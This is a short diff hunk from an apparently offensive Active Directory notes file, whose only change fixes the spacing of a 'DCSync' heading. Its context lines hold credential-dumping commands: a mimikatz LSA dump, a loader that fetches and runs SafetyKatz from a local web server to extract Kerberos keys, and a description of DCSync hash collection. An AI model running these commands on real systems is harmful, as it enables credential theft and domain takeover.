@@ -352,7 +352,7 @@ lsadump::lsa /patch
 #or in one command
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
 ```
-###DCSync
+### DCSync
 This method targets a DC, requests directory replication, and collects password hashes from the subsequent response.
 #### Validate Replication Rights 
 ```powershell
